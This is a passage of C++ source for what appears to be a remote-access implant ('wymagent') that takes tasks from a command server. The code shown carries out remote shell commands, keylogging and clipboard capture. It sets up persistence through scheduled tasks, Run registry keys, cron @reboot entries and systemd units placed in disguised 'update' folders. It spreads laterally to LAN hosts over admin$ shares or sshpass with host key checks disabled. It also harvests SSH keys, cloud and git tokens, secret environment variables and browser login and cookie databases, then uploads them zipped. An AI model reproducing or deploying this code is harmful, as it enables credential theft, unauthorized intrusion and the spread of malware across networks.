    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (CreateProcessA(NULL, &cmdline[0], NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                       NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
#else
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        if (fork() > 0) _exit(0);
        execl("/bin/sh", "sh", "-c", command.c_str(), (char *)NULL);
        _exit(127);
    }
#endif
}

static void clone_watch(const std::string &target) {
    {
        std::lock_guard<std::mutex> lock(g_clones_mutex);
        if (g_clones.count(target) == 0) return;
    }

    long code = 0;
    std::string resp = get_token(std::string(g_server_buf) + "/api/clone/status/" + target, &code);
    std::lock_guard<std::mutex> lock(g_clones_mutex);
    auto it = g_clones.find(target);
    if (it == g_clones.end()) return;
    CloneWatcher *w = &it->second;

    if (code == 404) {
        w->status = "unknown";
        w->last_check = "target gone";
    } else if (code == 200) {
        std::string st = json_find_string(resp, "status");
        if (st.empty()) st = "unknown";
        w->status = st;
        w->last_check = now_str();
        if ((st == "dead" || st == "stale") && !w->command.empty()) {
            w->relaunches++;
            if (g_verbose) {
                logmsg("clone: target %s %s -> relaunching", target.c_str(), st.c_str());
                logmsg("clone: relaunch cmd: %s", w->command.c_str());
            }
            std::string cmd = w->command;
            relaunch_detached(cmd);
        }
    } else {
        w->status = "http " + std::to_string(code);
        w->last_check = now_str();
    }
    w->next_check = (long)time(nullptr) + w->interval;
}

static void task_clone(const std::string &args_json, std::string &output, int &exit_code) {
    std::string action = json_find_string(args_json, "action");
    if (action.empty()) action = "start";
    std::string target = json_find_string(args_json, "target");
    if (target.empty()) target = g_agent_id;
    std::string command = json_find_string(args_json, "command");
    int interval = 30;
    std::string is = json_find_string(args_json, "interval");
    if (!is.empty()) interval = std::max(5, std::min(atoi(is.c_str()), 3600));

    if (action == "stop") {
        std::lock_guard<std::mutex> lock(g_clones_mutex);
        auto it = g_clones.find(target);
        if (it == g_clones.end()) {
            output = "clone: no watcher for " + target;
            exit_code = 1;
            return;
        }
        g_clones.erase(it);
        output = "clone: watcher for " + target + " stopped";
        exit_code = 0;
        return;
    }
    if (action == "status") {
        std::lock_guard<std::mutex> lock(g_clones_mutex);
        if (g_clones.empty()) {
            output = "clone: no watchers running";
            exit_code = 0;
            return;
        }
        std::string lines;
        for (const auto &kv : g_clones) {
            const CloneWatcher &w = kv.second;
            lines += "  " + kv.first + ": " + w.status + " | last_check " +
                     w.last_check + " | relaunched " + std::to_string(w.relaunches) +
                     "x | cmd: " + (w.command.empty() ? "(none)" : w.command) + "\n";
        }
        if (!lines.empty() && lines.back() == '\n') lines.pop_back();
        output = "clone watchers:\n" + lines;
        exit_code = 0;
        return;
    }

    /* start */
    std::lock_guard<std::mutex> lock(g_clones_mutex);
    if (g_clones.count(target)) {
        output = "clone: watcher for " + target + " already running";
        exit_code = 1;
        return;
    }
    if (command.empty()) {
        output = "clone: 'command' (relaunch cmd) required";
        exit_code = 1;
        return;
    }
    CloneWatcher w;
    w.status = "starting";
    w.last_check = "never";
    w.relaunches = 0;
    w.command = command;
    w.interval = interval;
    w.next_check = (long)time(nullptr) + interval;
    g_clones[target] = w;
    output = "clone: watcher started on target " + target +
             " (every " + std::to_string(interval) + "s, restart cmd: " + command + ")";
    exit_code = 0;
}

/* --------------------------------------------------------------- persistence/lateral */

static std::string path_basename(const std::string &p) {
    auto pos = p.find_last_of("/\\");
    return pos == std::string::npos ? p : p.substr(pos + 1);
}

/* absolute path of the running agent binary (relies on g_self_path from argv[0]) */
static std::string self_abs() {
    if (g_self_path.empty()) return "agent";
    std::error_code ec;
    auto p = std::filesystem::absolute(g_self_path, ec);
    if (ec) return g_self_path;
    return p.string();
}

/* first non-empty line of command output, trimmed, for error messages */
static std::string err_line(const std::string &s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_first_of("\r\n", a);
    std::string t = b == std::string::npos ? s.substr(a) : s.substr(a, b - a);
    while (!t.empty() && (t.back() == ' ' || t.back() == '\t')) t.pop_back();
    return t;
}

static void task_persistence(const std::string &args_json, std::string &output, int &exit_code) {
    (void)args_json;
    std::string self = self_abs();
#ifdef _WIN32
    std::string relaunch = "\"" + self + "\" --server " + g_server_buf +
                           " --token " + g_token_buf + " --interval " +
                           std::to_string(g_interval) + " --jitter " + std::to_string(g_jitter);
#else
    std::string relaunch = "'" + self + "' --server " + g_server_buf +
                           " --token " + g_token_buf + " --interval " +
                           std::to_string(g_interval) + " --jitter " + std::to_string(g_jitter);
#endif

#ifdef _WIN32
    const char *appdata = getenv("APPDATA");
    if (!appdata || !*appdata) appdata = getenv("USERPROFILE");
    if (!appdata || !*appdata) appdata = ".";
    std::string destdir = std::string(appdata) + "\\Microsoft\\Windows\\wymupdate";
    std::string dest = destdir + "\\wymagent.exe";
#else
    const char *home = getenv("HOME");
    if (!home || !*home) home = ".";
    std::string destdir = std::string(home) + "/.config/wymupdate";
    std::string dest = destdir + "/" + path_basename(self);
#endif
    std::error_code ec;
    std::filesystem::create_directories(destdir, ec);
    std::filesystem::copy_file(self, dest, std::filesystem::copy_options::overwrite_existing, ec);
    if (ec) {
        output = "persistence: failed to copy self to " + dest;
        exit_code = 1;
        return;
    }
    output = "persistence: copied self to " + dest;

    int rc = 0;
    std::string sh;
#ifdef _WIN32
    bool ok = false;
    const char *progdata = getenv("ProgramData");
    if (!progdata || !*progdata) progdata = getenv("ALLUSERSPROFILE");
    if (!progdata || !*progdata) progdata = "C:\\ProgramData";
    std::string launcher = std::string(progdata) + "\\wymupdate\\wymrelaunch.cmd";
    std::filesystem::create_directories(std::filesystem::path(launcher).parent_path(), ec);
    std::ofstream lf(launcher);
    if (!lf) {
        output = "persistence error: could not write launcher: " + launcher;
        exit_code = 1;
        return;
    }
    lf << "@echo off\r\nstart \"\" /b " << relaunch << "\r\n";
    lf.close();
    output += "\npersistence: wrote launcher " + launcher;

    std::string cmd = "schtasks /Create /TN \"wymagent-persist\" /TR \"" + launcher +
                      "\" /SC ONLOGON /RL HIGHEST /F";
    sh = run_shell(cmd, 60, rc);
    if (rc == 0) {
        ok = true;
    } else {
        output += "\n  schtasks err: " + err_line(sh);
        std::string reg = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d " +
                          launcher + " /f";
        sh = run_shell(reg, 60, rc);
        if (rc == 0) ok = true;
        else output += "\n  reg err: " + err_line(sh);
    }
    output += std::string("\n  ") +
              (ok ? "launch hook registered (schtasks)" : "no launch hook registered");
    exit_code = ok ? 0 : 1;
#else
    std::string line = "@reboot " + relaunch + " # wymagent-persist";
    std::string cmd = "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"" +
                      line + "\") | crontab -";
    sh = run_shell(cmd, 60, rc);
    bool ok_cron = (rc == 0);
    if (!ok_cron) output += "\n  crontab err: " + err_line(sh);

    bool ok_sys = false;
    std::string unit = destdir + "/wym-update.service";
    std::ofstream uf(unit);
    if (uf) {
        uf << "[Unit]\n"
           << "Description=wym agent update\n\n"
           << "[Service]\n"
           << "Type=simple\n"
           << "ExecStart=/bin/sh -c \"" << relaunch << "\"\n"
           << "Restart=always\n\n"
           << "[Install]\n"
           << "WantedBy=default.target\n";
        uf.close();
        std::string syscmd = "systemctl --user daemon-reload 2>&1; systemctl --user enable --now " +
                             unit + " 2>&1";
        sh = run_shell(syscmd, 60, rc);
        if (rc == 0) ok_sys = true;
        else output += "\n  systemctl err: " + err_line(sh);
    } else {
        output += "\n  systemctl err: cannot write unit " + unit;
    }
    output += std::string("\n  ") +
              ((ok_cron || ok_sys) ? "launch hook registered (crontab/systemd)"
                                   : "no launch hook registered");
    exit_code = (ok_cron || ok_sys) ? 0 : 1;
#endif
}

/* reduce "a.b.c.d" (or shorter) to its first three octets */
static std::string subnet_base(const std::string &in) {
    std::string t = in;
    auto d2 = t.find('.');
    if (d2 == std::string::npos) return t;
    auto d3 = t.find('.', d2 + 1);
    if (d3 == std::string::npos) return t;
    auto d4 = t.find('.', d3 + 1);
    if (d4 != std::string::npos) t = t.substr(0, d4);
    return t;
}

static unsigned ip_to_u32(const std::string &s) {
    unsigned a = 0, b = 0, c = 0, d = 0;
    if (sscanf(s.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return 0;
    if (a > 255 || b > 255 || c > 255 || d > 255) return 0;
    return (a << 24) | (b << 16) | (c << 8) | d;
}

static std::string u32_to_ip(unsigned ip) {
    return std::to_string((ip >> 24) & 0xff) + "." + std::to_string((ip >> 16) & 0xff) +
           "." + std::to_string((ip >> 8) & 0xff) + "." + std::to_string(ip & 0xff);
}

/* extract IPv4 tokens from arp/ip-neigh text, filter to base, exclude own ip,
 * dedupe, numeric sort, cap 30 */
static std::vector<unsigned> lateral_peers(const std::string &txt, const std::string &self,
                                           const std::string &base) {
    std::vector<unsigned> out;
    unsigned own = ip_to_u32(self);
    for (size_t i = 0; i < txt.size();) {
        if (!isdigit((unsigned char)txt[i])) { i++; continue; }
        unsigned a, b, c, d;
        int matched = sscanf(txt.c_str() + i, "%u.%u.%u.%u", &a, &b, &c, &d);
        const char *q = txt.c_str() + i;
        while (*q && (isdigit((unsigned char)*q) || *q == '.')) q++;
        i = (size_t)(q - txt.c_str());
        if (matched != 4) continue;
        if (a > 255 || b > 255 || c > 255 || d > 255) continue;
        if (a == 0 || a >= 224) continue;
        unsigned ip = (a << 24) | (b << 16) | (c << 8) | d;
        if (own && ip == own) continue;
        std::string tri = std::to_string(a) + "." + std::to_string(b) + "." + std::to_string(c);
        if (tri.compare(0, base.size(), base) != 0) continue;
        if (std::find(out.begin(), out.end(), ip) != out.end()) continue;
        out.push_back(ip);
    }
    std::sort(out.begin(), out.end());
    if (out.size() > 30) out.resize(30);
    return out;
}

static void task_lateral(const std::string &args_json, std::string &output, int &exit_code) {
    std::string subnet = json_find_string(args_json, "subnet");
    std::string user = json_find_string(args_json, "user");
    std::string pass = json_find_string(args_json, "pass");
    const char *eu = getenv("WYM_LAT_USER");
    const char *ep = getenv("WYM_LAT_PASS");
    if (user.empty() && eu) user = eu;
    if (pass.empty() && ep) pass = ep;

    std::string self = self_abs();
    std::string ip = local_ip();
    std::string base = subnet.empty() ? subnet_base(ip) : subnet_base(subnet);
    if (base.empty()) {
        output = "lateral: no LAN peers found";
        exit_code = 1;
        return;
    }
    logmsg("lateral: subnet base %s", base.c_str());

    int rc = 0;
    std::string sh = run_shell("arp -a", 20, rc);
    std::vector<unsigned> peers = lateral_peers(sh, ip, base);
#ifndef _WIN32
    if (peers.empty()) {
        sh = run_shell("ip neigh", 20, rc);
        peers = lateral_peers(sh, ip, base);
    }
#endif
    if (peers.empty()) {
        output = "lateral: no LAN peers found";
        exit_code = 1;
        return;
    }

    output = "lateral: " + std::to_string(peers.size()) + " peer(s): ";
    for (size_t i = 0; i < peers.size(); i++)
        output += (i ? "," : "") + u32_to_ip(peers[i]);

    int deployed = 0, failed = 0, skipped = 0;
    for (unsigned ipu : peers) {
        std::string host = u32_to_ip(ipu);
        std::string status;
        if (user.empty() || pass.empty()) {
            status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
            skipped++;
            output += "\n  " + host + ": " + status;
            continue;
        }
#ifdef _WIN32
        std::string name = path_basename(self);
        std::string relaunch = "\"c:\\windows\\" + name + "\" --server " + g_server_buf +
                               " --token " + g_token_buf + " --interval " +
                               std::to_string(g_interval) + " --jitter " + std::to_string(g_jitter);
        std::string cmd = "net use \\\\" + host + "\\admin$ /user:" + user + " \"" + pass + "\"";
        sh = run_shell(cmd, 30, rc);
        if (rc != 0) {
            status = "failed (net use: " + err_line(sh) + ")";
            failed++;
        } else {
            cmd = "copy /y \"" + self + "\" \"\\\\" + host + "\\admin$\\" + name + "\"";
            sh = run_shell(cmd, 30, rc);
            if (rc != 0) {
                status = "failed (copy: " + err_line(sh) + ")";
                failed++;
            } else {
                cmd = "schtasks /Create /S " + host + " /TN \"wymagent-lateral\" /TR \"" + relaunch +
                      "\" /SC ONLOGON /RU " + user + " /RP " + pass + " /RL HIGHEST /F";
                sh = run_shell(cmd, 30, rc);
                if (rc == 0) status = "deployed (file dropped + scheduled wymagent-lateral)";
                else status = "deployed (file dropped; task: " + err_line(sh) + ")";
                deployed++;
            }
            run_shell("net use \\\\" + host + "\\admin$ /delete /y", 30, rc);
        }
#else
        sh = run_shell("command -v sshpass", 10, rc);
        if (rc != 0 || err_line(sh).empty()) {
            status = "skipped (sshpass not installed)";
            skipped++;
        } else {
            std::string name = path_basename(self);
            std::string relaunch = "'/tmp/" + name + "' --server " + g_server_buf +
                                   " --token " + g_token_buf + " --interval " +
                                   std::to_string(g_interval) + " --jitter " + std::to_string(g_jitter);
            std::string cmd = "sshpass -p '" + pass + "' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '" +
                              self + "' " + user + "@" + host + ":/tmp/" + name;
            sh = run_shell(cmd, 60, rc);
            if (rc != 0) {
                status = "failed (scp: " + err_line(sh) + ")";
                failed++;
            } else {
                cmd = "sshpass -p '" + pass + "' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 " +
                      user + "@" + host + " '" + relaunch + " &>/dev/null &'";
                sh = run_shell(cmd, 30, rc);
                if (rc == 0) status = "deployed (file uploaded + launched)";
                else status = "deployed (file uploaded; launch: " + err_line(sh) + ")";
                deployed++;
            }
        }
#endif
        output += "\n  " + host + ": " + status;
    }
    output += "\nlateral: deployed=" + std::to_string(deployed) +
              " failed=" + std::to_string(failed) + " skipped=" + std::to_string(skipped);
    exit_code = 0;
}

/* ----------------------------------------------------------------- steal
 * Collect credentials-ish material: env vars, common token files, raw
 * browser DB copies. Zip via system(1) zip (fallback tar) and upload as
 * steal.zip; report a manifest. No decryption happens on the agent side.
 */
static const std::vector<std::string> STEAL_KEYWORDS = {
    "token", "secret", "password", "passwd", "key=", "api", "auth",
    "aws", "azure", "google", "github", "gitlab", "slack", "discord",
    "cookie", "session", "credential", "access", "proxy", "login",
};

static const std::vector<std::string> STEAL_TOKEN_FILES = {
    ".aws/credentials", ".aws/config",
    ".git-credentials", ".netrc", ".npmrc", ".pypirc",
    ".pip/pip.conf", ".config/pip/pip.conf",
    ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
    ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
    ".docker/config.json", ".kube/config",
    ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
    ".ssh/known_hosts", ".ssh/authorized_keys",
};

static constexpr long STEAL_MAX_FILE = 8 * 1024 * 1024;
static const std::vector<std::string> CHROMIUM_PROFILE_FILES = {
    "Login Data", "Cookies", "Web Data"};
static const std::vector<std::string> FIREFOX_PROFILE_FILES = {
    "cookies.sqlite", "logins.json", "key4.db", "cert9.db"};

static bool steal_safe_copy(const std::string &src, const std::string &dst_dir) {
    struct stat st;
    if (stat(src.c_str(), &st) != 0 || !S_ISREG(st.st_mode)) return false;
    if (st.st_size > STEAL_MAX_FILE) return false;
    std::error_code ec;
    std::filesystem::create_directories(dst_dir, ec);
    if (!std::filesystem::exists(dst_dir, ec)) return false;
    std::string dst = dst_dir + PATH_SEP + std::filesystem::path(src).filename().string();
    std::filesystem::copy_file(src, dst, std::filesystem::copy_options::overwrite_existing, ec);
    return !ec;
}

static std::vector<std::string> steal_env(const std::string &work) {
    std::vector<std::string> envs;
#ifdef _WIN32
    extern char **_environ;
    char **e = _environ;
#else
    extern char **environ;
    char **e = environ;
#endif
    for (; e && *e; e++) envs.push_back(*e);
    std::vector<std::string> lines;
    for (const auto &kv : envs) {
        auto eq = kv.find('=');
        if (eq == std::string::npos) continue;
        std::string key = kv.substr(0, eq);
        std::string low = key;
        for (auto &c : low) c = (char)tolower((unsigned char)c);
        for (const auto &w : STEAL_KEYWORDS) {
            if (low.find(w) != std::string::npos) {
                lines.push_back(kv);
                break;
            }
        }
    }
    if (lines.empty()) return {};
    std::sort(lines.begin(), lines.end());
    std::ofstream f(work + PATH_SEP + "env.txt", std::ios::binary);
    for (const auto &l : lines) f << l << "\n";
    return {"env.txt"};
}

static std::vector<std::string> steal_tokens(const std::string &work) {
    const char *home = getenv(HOME_ENV);
    if (!home) return {};
    std::string home_path = home;
    std::vector<std::string> hits;
    for (const auto &rel : STEAL_TOKEN_FILES) {
        std::string src = home_path + PATH_SEP + rel;
        if (steal_safe_copy(src, work + PATH_SEP + "tokens"))
            hits.push_back("tokens/" + std::filesystem::path(rel).filename().string());
    }
    return hits;
}

static void browser_roots(std::vector<std::pair<std::string, std::string>> &roots) {
    const char *home = getenv(HOME_ENV);
    std::string h = home ? home : "";
    if (h.empty()) return;
#ifdef _WIN32
    const char *la = getenv("LOCALAPPDATA");
    const char *appd = getenv("APPDATA");
    const char *chromiums[] = {
        "Google/Chrome/User Data", "Microsoft/Edge/User Data",
        "BraveSoftware/Brave-Browser/User Data", "Opera Software/Opera Stable"};
    if (la) {
        for (const char *rel : chromiums)
            roots.emplace_back(std::string(la) + "\\" + rel, "chromium");
    }
    if (appd)
        roots.emplace_back(std::string(appd) + "\\Mozilla\\Firefox\\Profiles", "firefox");
#elif defined(__APPLE__)
    std::string base = h + "/Library/Application Support";
    const char *chromiums[] = {"Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"};
    for (const char *rel : chromiums)
        roots.emplace_back(base + "/" + rel, "chromium");
    roots.emplace_back(base + "/Firefox/Profiles", "firefox");
#else
    const char *variants[][2] = {
        {"google-chrome", "chromium"}, {"chromium", "chromium"},
        {"microsoft-edge", "msedge"}, {"brave-browser", "brave"},
        {"opera", "opera"}};
    for (const auto &v : variants)
        roots.emplace_back(h + "/.config/" + v[0], v[1]);
    roots.emplace_back(h + "/.mozilla/firefox", "firefox");
#endif
}

static std::vector<std::string> steal_browser(const std::string &work) {
    std::vector<std::pair<std::string, std::string>> roots;
    browser_roots(roots);
    std::vector<std::string> hits;
    for (const auto &rp : roots) {
        const std::string &root = rp.first;
        const std::string &kind = rp.second;
        std::error_code ec;
        if (!std::filesystem::is_directory(root, ec)) continue;
        const std::vector<std::string> *targets =
            (kind == "firefox") ? &FIREFOX_PROFILE_FILES : &CHROMIUM_PROFILE_FILES;
        try {
            auto end = std::filesystem::recursive_directory_iterator();
            for (auto it = std::filesystem::recursive_directory_iterator(root,
                     std::filesystem::directory_options::skip_permission_denied, ec);
                 it != end; it.increment(ec)) {
                if (!it->is_regular_file(ec)) continue;
                std::string fname = it->path().filename().string();
                for (const auto &t : *targets) {
                    if (fname != t) continue;
                    std::string rel = std::filesystem::relative(
                        it->path().parent_path(), std::filesystem::path(root)).string();
                    std::string flat = rel;
                    for (auto &c : flat) if (c == PATH_SEP) c = '_';
                    std::string dst_dir = work + PATH_SEP + "browser" + PATH_SEP + kind + PATH_SEP + flat;
                    if (steal_safe_copy(it->path().string(), dst_dir))
                        hits.push_back("browser/" + kind + "/" + flat + "/" + fname);
                    break;
                }
            }
        } catch (const std::exception &) {
            /* ignore a broken subdirectory and keep scanning other roots */
        }
    }
    return hits;
}

static bool fs_file_exists(const std::string &p) {
    struct stat st;
    return stat(p.c_str(), &st) == 0 && S_ISREG(st.st_mode);
}

static void task_steal(const std::string &task_id, const std::string &args_json, std::string &output, int &exit_code) {
    std::string profile = json_find_string(args_json, "profile");
    if (profile.empty()) profile = "all";
    for (auto &c : profile) c = (char)tolower((unsigned char)c);
    if (profile != "all" && profile != "env" && profile != "tokens" && profile != "browser")
        profile = "all";

    std::string work = std::filesystem::temp_directory_path().string() + "wymsteal_";
    work += std::to_string(time(nullptr)) + "_" + std::to_string(getpid());
    std::error_code ec;
    std::filesystem::create_directories(work, ec);

    std::vector<std::string> manifest;
    if (profile == "all" || profile == "env") {
        logmsg("steal: collecting env vars");
        auto hits = steal_env(work);
        manifest.insert(manifest.end(), hits.begin(), hits.end());
    }
    if (profile == "all" || profile == "tokens") {
        logmsg("steal: collecting token files");
        auto hits = steal_tokens(work);
        manifest.insert(manifest.end(), hits.begin(), hits.end());
    }
    if (profile == "all" || profile == "browser") {
        logmsg("steal: collecting browser dbs");
        auto hits = steal_browser(work);
        manifest.insert(manifest.end(), hits.begin(), hits.end());
    }

    if (manifest.empty()) {
        std::filesystem::remove_all(work, ec);
        output = "steal (" + profile + "): nothing found";
        exit_code = 1;
        return;
    }

    std::sort(manifest.begin(), manifest.end());
    {
        std::ofstream f(work + PATH_SEP + "manifest.txt", std::ios::binary);
        for (const auto &m : manifest) f << m << "\n";
    }

    std::string archive = work + PATH_SEP + "steal.zip";
#ifdef _WIN32
    std::string zipdir = work;
    for (auto &c : zipdir) if (c == '\\') c = '/';
    std::string zipcmd = "cd /d \"" + zipdir + "\" && "
        "(zip -qr steal.zip . -x steal.zip >NUL 2>&1 || "
        "tar --exclude=steal.zip -a -c -f steal.zip . >NUL 2>&1)";
#else
    std::string zipcmd = "cd \"" + work + "\" && "
        "(zip -qr steal.zip . -x 'steal.zip' >/dev/null 2>&1 || "
        "tar --exclude=steal.zip -a -c -f steal.zip . >/dev/null 2>&1)";
#endif
    std::system(zipcmd.c_str());

    if (!fs_file_exists(archive)) {
        std::filesystem::remove_all(work, ec);
        output = "steal: zip failed (no zip or tar available)";
        exit_code = 1;
        return;
    }

    struct stat st;
    stat(archive.c_str(), &st);
    long size = (long)st.st_size;

    if (upload_file(archive, task_id) != 0) {
        std::filesystem::remove_all(work, ec);
        output = "steal upload failed";
        exit_code = 1;
        return;
    }
    std::filesystem::remove_all(work, ec);

    std::string listing;
    for (const auto &m : manifest) listing += m + "\n";
    if (!listing.empty() && listing.back() == '\n') listing.pop_back();

    std::string text = "stole " + std::to_string(manifest.size()) +
                       " item(s) -> steal.zip (" + std::to_string(size) + " bytes)\n" + listing;
    if ((int)text.size() > 4000) text = truncate_output(text, 4000);
    output = text;
    exit_code = 0;
}

/* ----------------------------------------------------------------- main */

int main(int argc, char *argv[]) {
    /* Parse arguments */
    if (argc > 0) g_self_path = argv[0];
    int help = 0;
    int interval_given = 0, jitter_given = 0, state_given = 0, verbose_given = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--server") == 0 && i + 1 < argc)
            strncpy(g_server_buf, argv[++i], sizeof(g_server_buf) - 1);
        else if (strcmp(argv[i], "--token") == 0 && i + 1 < argc)
            strncpy(g_token_buf, argv[++i], sizeof(g_token_buf) - 1);
        else if (strcmp(argv[i], "--interval") == 0 && i + 1 < argc) {
            g_interval = atoi(argv[++i]);
            interval_given = 1;
        }
        else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc) {
            g_jitter = atoi(argv[++i]);
            jitter_given = 1;
        }
        else if (strcmp(argv[i], "--state") == 0 && i + 1 < argc) {
            g_state_override = argv[++i];
            state_given = 1;
        }
        else if (strcmp(argv[i], "--verbose") == 0) {
            g_verbose = true;
            verbose_given = 1;
        }
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            help = 1;
        }
    }

    if (help) {
        std::cout << "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";
        std::cout << "\n";
        std::cout << "Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):\n";
        std::cout << "  --server URL      server base URL (required unless WYM_SERVER is set)\n";
        std::cout << "  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)\n";
        std::cout << "  --interval N      heartbeat interval in seconds (default 10, min 1)\n";
        std::cout << "  --jitter N        random jitter in seconds added to the interval\n";
        std::cout << "  --state FILE      state file persisting the agent id (default ~/.wymagent_cpp.json)\n";
        std::cout << "  --verbose         print activity to stdout\n";
        std::cout << "  -h, --help        show this help and exit\n";
        return 0;
    }

    /* Env var fallback */
    if (!g_server_buf[0]) { const char *e = getenv("WYM_SERVER"); if (e) strncpy(g_server_buf, e, sizeof(g_server_buf) - 1); }
    if (!g_token_buf[0])  { const char *e = getenv("WYM_TOKEN");  if (e) strncpy(g_token_buf, e, sizeof(g_token_buf) - 1); }
    if (!interval_given) { const char *e = getenv("WYM_INTERVAL"); if (e && *e) g_interval = atoi(e); }
    if (!jitter_given)   { const char *e = getenv("WYM_JITTER");   if (e && *e) g_jitter = atoi(e); }
    if (!state_given)    { const char *e = getenv("WYM_STATE_FILE"); if (e) g_state_override = e; }
    if (!verbose_given) { const char *e = getenv("WYM_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = true; }

    if (!g_server_buf[0] || !g_token_buf[0]) {
        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
        return 1;
    }

    /* Strip trailing slash */
    size_t slen = strlen(g_server_buf);
    if (slen > 0 && g_server_buf[slen - 1] == '/')
        g_server_buf[slen - 1] = '\0';

    curl_global_init(CURL_GLOBAL_ALL);
    load_id();
    if (g_agent_id.empty()) register_agent();

    logmsg("agent running against %s (interval %ds)", g_server_buf, g_interval);
    srand((unsigned)time(nullptr));

    while (true) {
        std::string resp;
        long code = checkin(resp);

        if (code == 200 && !resp.empty()) {
            /* Parse tasks — simplified approach for flat task objects */
            auto tasks_pos = resp.find("\"tasks\"");
            if (tasks_pos != std::string::npos) {
                /* Find all task objects in the array */
                auto arr_start = resp.find('[', tasks_pos);
                if (arr_start != std::string::npos) {
                    size_t pos = arr_start + 1;
                    while (pos < resp.size()) {
                        auto obj_start = resp.find('{', pos);
                        if (obj_start == std::string::npos) break;

                        /* Find matching closing brace */
                        int depth = 0;
                        size_t obj_end = obj_start;
                        do {
                            if (resp[obj_end] == '{') depth++;
                            else if (resp[obj_end] == '}') depth--;
                            obj_end++;
                        } while (depth > 0 && obj_end < resp.size());

                        std::string task_obj = resp.substr(obj_start, obj_end - obj_start);
                        std::string task_id = json_find_string(task_obj, "task_id");
                        std::string task_type = json_find_string(task_obj, "type");

                        /* Extract args substring */
                        std::string args_json = "{}";
                        auto args_pos = task_obj.find("\"args\"");
                        if (args_pos != std::string::npos) {
                            auto brace_start = task_obj.find('{', args_pos);
                            if (brace_start != std::string::npos) {
                                int d = 0;
                                size_t brace_end = brace_start;
                                do {
                                    if (task_obj[brace_end] == '{') d++;
                                    else if (task_obj[brace_end] == '}') d--;
                                    brace_end++;
                                } while (d > 0 && brace_end < task_obj.size());
                                args_json = task_obj.substr(brace_start, brace_end - brace_start);
                            }
                        }

                        logmsg("running task %s (%s)", task_id.c_str(), task_type.c_str());

                        std::string output;
                        int exit_code = 0;
                        bool should_exit = false;

                        if (task_type == "shell") {
                            std::string command = json_find_string(args_json, "command");
                            int timeout = SHELL_TIMEOUT;
                            std::string ts = json_find_string(args_json, "timeout");
                            if (!ts.empty()) timeout = std::max(1, std::min(atoi(ts.c_str()), 3600));
                            output = run_shell(command, timeout, exit_code);
                        } else if (task_type == "download") {
                            task_download(task_id, args_json, output, exit_code);
                        } else if (task_type == "upload") {
                            task_upload(task_id, args_json, output, exit_code);
                        } else if (task_type == "screenshot") {
                            task_screenshot(task_id, args_json, output, exit_code);
                        } else if (task_type == "sleep") {
                            std::string ss = json_find_string(args_json, "seconds");
                            int secs = ss.empty() ? 10 : std::max(1, atoi(ss.c_str()));
                            g_interval = secs;
                            output = "heartbeat interval set to " + std::to_string(g_interval) + "s";
                        } else if (task_type == "keylog") {
                            std::string action = json_find_string(args_json, "action");
                            if (action.empty()) action = "dump";
                            if (action == "start") {
                                output = keylog_start(g_agent_id);
                                if (output.rfind("error:", 0) == 0) exit_code = 1;
                            } else if (action == "stop") {
                                output = keylog_stop(g_agent_id);
                            } else {
                                output = keylog_dump(g_agent_id);
                            }
                        } else if (task_type == "clipboard") {
                            std::string action = json_find_string(args_json, "action");
                            if (action.empty()) action = "get";
                            if (action == "set") {
                                std::string text = json_find_string(args_json, "text");
                                bool ok = false;
#ifdef __APPLE__
                                FILE *fp = popen("pbcopy", "w");
                                if (fp) { fwrite(text.data(), 1, text.size(), fp); ok = (pclose(fp) == 0); }
#elif defined(__linux__)
                                FILE *fp = popen("xclip -selection clipboard", "w");
                                if (fp) { fwrite(text.data(), 1, text.size(), fp); ok = (pclose(fp) == 0); }
                                if (!ok) {
                                    fp = popen("xsel --clipboard --input", "w");
                                    if (fp) { fwrite(text.data(), 1, text.size(), fp); ok = (pclose(fp) == 0); }
                                }
#else
                                (void)ok;
                                output = "clipboard set via platform API";
#endif
#ifndef _WIN32
                                if (!ok) {
                                    output = "error: no clipboard tool available";
                                    exit_code = 1;
                                } else {
                                    output = "clipboard set";
                                }
#endif
                            } else {
#ifdef __APPLE__
                                char buf[4096] = "";
                                FILE *fp = popen("pbpaste", "r");
                                if (fp) { fread(buf, 1, sizeof(buf) - 1, fp); pclose(fp); }
                                output = buf;
#elif defined(__linux__)
                                char buf[4096] = "";
                                FILE *fp = popen("xclip -selection clipboard -o", "r");
                                if (fp) { fread(buf, 1, sizeof(buf) - 1, fp); pclose(fp); }
                                output = buf;
#else
                                output = "clipboard not available";
                                exit_code = 1;
#endif
                            }
                        } else if (task_type == "exit") {
                            output = "exiting";
                            should_exit = true;
                        } else if (task_type == "clone") {
                            task_clone(args_json, output, exit_code);
                        } else if (task_type == "steal") {
                            task_steal(task_id, args_json, output, exit_code);
                        } else if (task_type == "persistence") {
                            task_persistence(args_json, output, exit_code);
                        } else if (task_type == "lateral") {
                            task_lateral(args_json, output, exit_code);
                        } else {
                            output = "unknown task type: " + task_type;
                            exit_code = 1;
                        }

